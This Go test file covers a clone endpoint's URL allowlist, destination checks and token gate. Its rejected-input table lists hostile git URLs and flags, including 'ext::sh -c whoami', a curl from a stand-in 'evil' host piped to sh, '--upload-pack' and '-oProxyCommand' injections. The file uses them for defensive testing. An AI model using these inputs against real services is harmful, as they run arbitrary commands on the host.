package studioapi

import (
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// The transports. `ext::` is the one that matters and is the reason this is an
// allowlist: `git clone 'ext::sh -c whoami'` is documented git behaviour and
// runs a command, so a denylist would be a guess at the shape of the next one.
func TestCloneURLIsAllowlisted(t *testing.T) {
	ok := []string{
		"https://github.com/owner/repo.git",
		"ssh://git@github.com/owner/repo.git",
		"git@github.com:owner/repo.git",
	}
	for _, u := range ok {
		if _, err := validCloneURL(u); err != nil {
			t.Errorf("validCloneURL(%q) refused a URL people actually paste: %v", u, err)
		}
	}

	bad := map[string]string{
		"ext::sh -c whoami":            "executes a command rather than fetching a repository",
		"ext::curl https://evil/ | sh": "the same, wearing a pipeline",
		"file:///etc":                  "reaches this machine's disk through a remote mechanism",
		"git://github.com/o/r.git":     "cleartext",
		"http://github.com/o/r.git":    "cleartext",
		"--upload-pack=touch /tmp/x":   "a flag, not a repository",
		"-oProxyCommand=id":            "a flag, not a repository",
		"":                             "nothing at all",
		"/srv/repos/thing.git":         "a bare local path",
	}
	for u, why := range bad {
		if _, err := validCloneURL(u); err == nil {
			t.Errorf("validCloneURL(%q) was accepted — %s", u, why)
		}
	}
}

// The destination gets the refusals a typed project path gets, before anything
// is written: nothing is created until the target has been argued with.
func TestCloneDestinationRefusals(t *testing.T) {
	parent := t.TempDir()
	existing := filepath.Join(parent, "taken")
	if err := os.Mkdir(existing, 0o755); err != nil {
		t.Fatal(err)
	}

	cases := []struct {
		name, parent, dir, want string
	}{
		{"no parent", "", "repo", "target directory is required"},
		{"relative parent", "code", "repo", "not an absolute path"},
		{"missing parent", filepath.Join(parent, "nope"), "repo", "no such directory"},
		{"a name with a separator", parent, "a/b", "one path segment"},
		{"traversal as a name", parent, "..", "not a directory name"},
		{"a name that is a flag", parent, "-x", "not a directory name"},
		{"destination already exists", parent, "taken", "already exists"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, err := cloneDestination(tc.parent, tc.dir, "https://example.com/o/r.git")
			if err == nil {
				t.Fatalf("accepted parent=%q name=%q", tc.parent, tc.dir)
			}
			if !strings.Contains(err.Error(), tc.want) {
				t.Errorf("refusal = %q, want it to mention %q", err, tc.want)
			}
		})
	}

	// The ordinary case, and git's own naming when none is given.
	dest, err := cloneDestination(parent, "", "https://github.com/owner/thing.git")
	if err != nil {
		t.Fatal(err)
	}
	if filepath.Base(dest) != "thing" {
		t.Errorf("derived name = %q, want thing — the last segment without .git, which is what git itself would pick", filepath.Base(dest))
	}
	// Nothing may have been created by working out where it would go.
	if _, err := os.Stat(dest); err == nil {
		t.Error("cloneDestination created the directory; resolving a target must not write")
	}
}

// End to end over HTTP, without a network: cloning a local repository is refused
// by the transport rule, so the closest honest check is that a bad request is
// refused *before* git runs and leaves nothing behind.
func TestCloneEndpointRefusesBeforeWriting(t *testing.T) {
	s, _ := newTestServer(t)
	// Past the token gate, because what this test is about is the URL: a server
	// with no token refuses cloning outright, which is
	// TestCloningNeedsTheServerToHaveAToken below.
	s.Token = "test-token"
	parent := t.TempDir()

	req := newTestRequest(t, http.MethodPost, "/v1/projects/clone", ProjectCloneRequest{
		URL: "ext::sh -c id", Parent: parent, Name: "pwned",
	})
	req.Header.Set("Authorization", "Bearer "+s.Token)
	rec := httptest.NewRecorder()
	s.Handler().ServeHTTP(rec, req)
	if rec.Code != http.StatusUnprocessableEntity {
		t.Fatalf("ext:: clone = %d, want 422: %s", rec.Code, rec.Body.String())
	}
	if _, err := os.Stat(filepath.Join(parent, "pwned")); err == nil {
		t.Error("a refused clone left a directory behind")
	}
}

// Cloning is refused outright on a daemon with no token.
//
// The same gate console/input has, for the same reason: every other endpoint
// resolves a registered id, so what this control plane touches is a list the
// user wrote. This one takes a host path and fetches code into it. Bounding
// *where* it may write — which cloneDestination does hard — is a different
// question from *who* may ask for it.
func TestCloningNeedsTheServerToHaveAToken(t *testing.T) {
	s, _ := newTestServer(t) // no Token set
	rec := doJSON(t, s, http.MethodPost, "/v1/projects/clone", ProjectCloneRequest{
		URL: "https://example.com/repo.git", Parent: t.TempDir(),
	}, nil)
	if rec.Code != http.StatusForbidden {
		t.Fatalf("POST /v1/projects/clone with no server token = %d, want 403: %s", rec.Code, rec.Body.String())
	}
	// And it says what to do about it, rather than only that it refused.
	if body := rec.Body.String(); !strings.Contains(body, "-token") {
		t.Errorf("the refusal does not mention how to enable it: %s", body)
	}
}
